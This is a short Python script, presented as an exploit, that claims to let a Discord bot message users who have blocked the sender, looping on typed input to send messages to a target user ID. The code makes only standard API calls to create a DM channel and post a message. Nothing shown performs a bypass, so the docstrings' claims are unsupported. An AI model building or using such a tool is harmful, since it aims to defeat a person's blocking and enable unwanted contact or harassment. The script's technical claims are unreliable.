import requests
import sys

class DiscordExploit:
    """
    Exploit class to demonstrate the bypassing of Discord's block feature.
    This bypass allows sending messages to users that have blocked the sender.
    
    Made By Taylor Christian Newsome
    """

    def __init__(self, token, client_id):
        """
        Initialize with Discord bot token and client ID.
        The bot token must have the necessary permissions for sending messages.
        """
        self.token = token
        self.client_id = client_id
        self.headers = {'Authorization': f'Bot {self.token}'}  # Ensure using Bot token authorization

    def _get_channel_id(self):
        """
        Create a new DM channel (bypassing block) by initiating a request to the
        Discord API endpoint for creating direct message channels.

        Returns:
            channel_id (str): Channel ID where the message will be sent.
        """
        url = 'https://discord.com/api/v10/users/@me/channels'
        data = {'recipient_id': self.client_id}
        
        # Send request to create a DM channel with blocked user
        res = requests.post(url, headers=self.headers, json=data)
        
        # Log the raw response for inspection and debugging
        if res.status_code == 200:
            print(f"DM channel successfully created with user {self.client_id}.")
        else:
            print(f"Failed to create DM channel. Status: {res.status_code}, Response: {res.text}")
        
        return res.json().get('id')

    def execute(self, message):
        """
        Send a message to the target user, even if blocked, by using the created DM channel.
        
        Args:
            message (str): The message to be sent to the target user.
        """
        channel_id = self._get_channel_id()
        if channel_id:
            # Send message to the newly created DM channel (bypassing block)
            url = f'https://discord.com/api/v10/channels/{channel_id}/messages'
            data = {'content': message}
            res = requests.post(url, headers=self.headers, json=data)
            
            # Log the status of the message being sent
            if res.status_code == 200:
                print(f"Message successfully sent to channel {channel_id}.")
            else:
                print(f"Failed to send message. Status: {res.status_code}, Response: {res.text}")

def main():
    """
    Main function to run the exploit. Takes the bot token and the target client ID as input.
    """
    if len(sys.argv) < 3:
        print(f'Usage: python {sys.argv[0]} <bot_token> <client_id>')
        sys.exit(1)

    token = sys.argv[1]
    client_id = sys.argv[2]

    exploit = DiscordExploit(token, client_id)

    while True:
        message = input("Enter the message to send to the blocked user: ")
        if not message:
            continue
        
        print(f"Attempting to send message to blocked user {client_id}...")
        exploit.execute(message)

if __name__ == '__main__':
    main()
